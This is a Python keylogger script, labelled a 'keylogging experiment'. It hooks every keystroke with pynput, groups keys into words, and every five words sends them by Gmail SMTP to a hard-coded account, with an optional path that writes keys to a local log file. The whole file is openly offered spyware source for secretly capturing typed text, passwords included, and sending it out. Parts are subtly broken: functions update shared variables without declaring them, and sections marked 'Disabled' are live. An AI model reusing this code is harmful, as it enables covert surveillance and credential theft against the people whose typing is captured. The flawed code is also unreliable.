########################################################################
#                                                                      #
#                    Super Awesome Project                             #
#                    Keylogging experiment                             #
#                                                                      #
########################################################################

import logging #for logging to a file
import smtplib #for sending email using SMTP protocol (gmail)

from pynput.keyboard import Key, Listener # for keylogs

########################################################################
#                                                                      #
#                    Emailing keylog - Disabled                        #
#                                                                      #
########################################################################

# email which receives the keystrokes 

email = 'your@gmail.com'
password = 'your password'
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

########################################################################
#                                                                      #
#                      Keylogging function                             #
#                                                                      #
########################################################################

# storing keys in file
count = 0
keys = []

# storing keys for email
full_log = ""
word = ""
email_word_limit = 5

# Function for when key is pressed
def on_press(key):
    global keys, count, full_log, word, email_word_limit

    # file logging
    # logging_file(key)
    
    # emailing log
    email_log(key)

########################################################################
#                                                                      #
#                      Emailing Logged Data                            #
#                                                                      #
########################################################################

def email_log(key):
    # checking in terminal
    print("{0} pressed".format(key))
    

    clean_key = str(key).replace("'","")
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log.split()) >= email_word_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    elif clean_key.find("Key") != -1:
        word += ' '
        word += clean_key
        word += ' '
    else:
        word += str(key).replace("'","")

########################################################################
#                                                                      #
#                      Logging keys into a file                        #
#                                                                      #
########################################################################

# for logging into file
def logging_file(key):
    # storing keys and increasing count in file
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    # if count >= 5, call write_file to save keys into a file
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

# Function to write the keys list into a file
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            clean_key = str(key).replace("'","")
            # if space key is pressed and the last line in file is not a newline enter new line
            if (clean_key.find("space") > 0) and not is_last_new_line_file():
                f.write('\n')
            # if key doesnt exist, then -1 will be written
            elif clean_key.find("Key") == -1:
                f.write(clean_key)
            prev_key = clean_key

# checks if the last line in the file is a new line
def is_last_new_line_file():
    with open('log.txt', 'r') as f:
        last_line = f.readlines()[-1]
        if last_line == '\n':
            return True
        return False

# Failsafe to break keylogger file - currently set at esc key
def on_release(key):
    if key == Key.esc:
        return False

########################################################################
#                                                                      #
#                    Emailing keylog - Disabled                        #
#                                                                      #
########################################################################
# send the Code that Sends the Append Keys is Press
def send_log():
    server.sendmail(
        email,
        email,
        full_log
    )

########################################################################
#                                                                      #
#                            With Listener                             #
#                                                                      #
########################################################################
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
